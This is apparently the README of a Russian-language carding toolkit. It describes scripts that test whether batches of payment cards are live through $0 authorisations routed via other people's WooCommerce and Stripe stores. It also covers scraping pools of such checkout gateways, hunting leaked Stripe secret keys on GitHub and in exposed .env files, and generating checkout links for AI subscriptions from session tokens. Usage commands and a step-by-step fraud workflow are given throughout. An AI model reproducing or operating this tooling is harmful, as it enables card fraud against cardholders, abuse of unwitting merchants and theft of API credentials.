# Check-

Набор инструментов для анализа платёжной инфраструктуры и проверки банковских карт.

## Компоненты

| Файл | Назначение |
|------|-----------|
| `card_checker.py` | Проверка карт на «живость» (Luhn → BIN → Stripe → WC checkout) |
| `batch_check.py` | Batch-проверка списка карт через WC Store API |
| `bin_checker.py` | Анализ платёжной инфраструктуры сайтов + BIN lookup |
| `site_scraper.py` | Сбор WooCommerce+Stripe шлюзов (Serper.dev) |
| `serper_deep.py` | Углублённый поиск legacy Stripe шлюзов |
| `fofa_scraper.py` | Поиск через FOFA API |
| `github_dorker.py` | Поиск sk_live_ ключей на GitHub |
| `sk_web_hunter.py` | Поиск sk_live_ через exposed .env файлы |
| `find_pk.py` | Быстрый поиск pk_live_ на сайтах |

## Установка

```bash
pip install -r requirements.txt
```

Зависимости: `httpx>=0.27`, `requests>=2.28`

## Card Checker — проверка карт

### Режимы работы

**1. Stripe напрямую (нужен pk_live_ или pk_test_):**
```bash
python card_checker.py "PAN|MM|YYYY|CVV" --key pk_live_xxx
python card_checker.py "PAN|MM|YYYY|CVV" --site https://example.com
```

**2. WooCommerce mode (без своего ключа — через чужие магазины):**
```bash
python card_checker.py "PAN|MM|YYYY|CVV" --wc
python card_checker.py --batch cards.txt --wc
```

**3. Batch через batch_check.py:**
```bash
python batch_check.py --file cards.txt
python batch_check.py --limit 5
echo "PAN|MM|YYYY|CVV" | python batch_check.py
```

### Уровни проверки

| Уровень | Что проверяет | Источник |
|---------|--------------|----------|
| 1 | Luhn (формат номера) | Локально |
| 2 | Brand + длина | Локально |
| 3 | Срок + CVV формат | Локально |
| 4 | BIN (банк, страна, тип) | binlist.net / handyapi.com |
| 5 | Live-check ($0 auth) | Stripe API / WC Store API |

### Вердикты WC mode

| Статус | Значение |
|--------|----------|
| LIVE | Карта подтверждена (insufficient_funds / incorrect_cvc / 3DS redirect) |
| DEAD | Карта отклонена (do_not_honor / lost_card / expired) |
| UNKNOWN | PM создан, но нет чёткого decline (generic "processing failed") |
| ERROR | Инфраструктурная ошибка (нет gateway / таймаут / антиспам) |

### Логика парсинга decline (5 приоритетов)

1. **redirect_url** → содержит stripe.com/3d_secure → LIVE (3DS)
2. **stripe_decline_code** → машинный код от Stripe (legacy плагины)
3. **stripe_error_code** → код ошибки Stripe
4. **errorMessage** → человекочитаемый текст ("Your card was declined")
5. **Fallback** → если PM создался = формат валиден, иначе DEAD

## Site Scraper — сбор шлюзов

### Принцип работы

1. Serper.dev поиск (3 уровня запросов: прямые → региональные → нишевые)
2. Quick check: Store API alive? (`GET /wp-json/wc/store/v1/cart` → 200?)
3. Deep validation: pk_live_, stripe_version, tokenization test, product, shipping

### Использование

```bash
# Полный скан (поиск + валидация)
python site_scraper.py --serper-key YOUR_KEY

# Переваладировать существующий пул
python site_scraper.py --validate-only

# Расширенный поиск legacy шлюзов
python serper_deep.py --serper-key YOUR_KEY
```

### Версии WC Stripe плагина

| Версия | Маркер | Для чекинга |
|--------|--------|-------------|
| legacy (< v6) | `wc_stripe_params` в HTML | Лучший — пробрасывает decline_code |
| upe (v6-7) | `wc-stripe-upe` | Средний |
| blocks (v8+) | `wc-stripe-blocks` | Худший — generic errors |

### Gateway Pool (gateway_pool.json)

Каждый шлюз в пуле содержит:
- `url` — адрес магазина
- `pk_key` — Stripe publishable key
- `tokenization` — "ok" / "blocked" / "other"
- `stripe_version` — "legacy" / "upe" / "blocks"
- `checkout_ready` — все компоненты проверены (product + shipping + nonce)
- `shipping_rate` — кешированный rate_id для checkout
- `product_id` — ID товара для add-to-cart

## BIN Checker — анализ сайтов

```bash
# Анализ платёжной инфраструктуры сайта
python bin_checker.py stripe.com
python bin_checker.py ads.google.com

# BIN Lookup
python bin_checker.py 424631

# JSON вывод
python bin_checker.py stripe.com --json

# Автоподбор карт для сайта
python bin_checker.py https://example.com --match --batch cards.txt
```

## Генерация Stripe Checkout ссылок

### ChatGPT Team
```bash
python bin_checker.py --generate chatgpt \
  --token <accessToken> \
  --country GB --promo codestonegb
```

### SuperGrok
```bash
python bin_checker.py --generate grok \
  --token <sso_cookie> \
  --plan supergrok
```

## Настройка

### .env файл (опционально)

```env
SERPER_KEY=your_serper_dev_api_key
STRIPE_PUBLISHABLE_KEY=pk_live_xxx
STRIPE_RESTRICTED_KEY=rk_live_xxx
```

### Рекомендуемый workflow

```bash
# 1. Собрать шлюзы
python site_scraper.py --serper-key KEY --max 200
python serper_deep.py --serper-key KEY

# 2. Проверить пул
python -c "import json; p=json.load(open('gateway_pool.json')); ok=[g for g in p if g.get('tokenization')=='ok']; print(f'Ready: {len(ok)}')"

# 3. Проверить карты
python batch_check.py --file cards.txt

# 4. Переваладировать пул (обновить nonce, статусы)
python site_scraper.py --validate-only
```

## Требования

- Python 3.10+
- httpx >= 0.27
- requests >= 2.28 (для github_dorker.py)
